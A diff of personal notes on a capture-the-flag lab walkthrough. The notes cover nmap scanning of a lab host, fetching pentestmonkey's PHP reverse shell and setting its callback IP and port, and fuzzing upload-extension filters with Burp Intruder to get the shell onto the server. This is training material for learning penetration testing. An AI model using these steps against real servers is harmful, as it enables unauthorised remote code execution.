@@ -17,9 +17,9 @@ https://www.youtube.com/watch?v=hvYWCegfEZs&list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp
     
    
 
-remote ip = 10.10.34.169
+<IP  >= remote ip =  10.10.231.94
 
-nmap -sV 10.10.34.169
+nmap -sV <IP>
 
 Identified open ports:
 
@@ -55,19 +55,29 @@ we can leverage this to upload and execute our payload, which will lead to compr
 
     Logically, the ideal would be to upload a .php file to execute code. Imagine it as a Trojan horse.
 
+download file:
+     https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+change lines
+  $ip = '10.10.231.94';  // CHANGE THIS   local IP not Remote IP
+  $port = 9001;         // CHANGE THIS     A random port number above 9000
 
-    We will fuzz the upload form to identify which extensions are not blocked. To do this, we'll use BurpSuite. We’re going to use Intruder (used to automate custom attacks). To start, make a wordlist with the following extensions:
+ goto upload dir http://10.10.231.94:3333/internal
+  and try to upload 
+  the result is 'Extension not allowed'
+  
+  So this extensio is not allowed
 
-nano phplist.txt
-input the next list:
+
+Now we need t5o find wich extensio is allowed:
+  To do this, we'll use BurpSuite. We’re going to use Intruder (used to automate custom attacks). To start, make a wordlist with the following extensions:
+
 .php
 .php3
 .php4
 .php5
 .phtml
 
-Ctrl + x and then y to save the file.
-cat phplist.txt
+https://youtu.be/hvYWCegfEZs?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=687 
 
 Search "foxyproxy extension" and add it 
 
@@ -90,8 +100,6 @@ Burpsuite will open, chose the temporary project, use the default parameters, an
 
 
 on the main manu, go to the Proxy tab, Intercept, and put the option in "Intercept is ON".
-
-https://medium.com/@Z3pH7/tryhackme-vulnversity-write-up-thm-dcd1f6b09fd8
 
 
 At this point, BurpSuite is intercepting. We can go back to Firefox and select the burpsuite Proxy we previously configured.
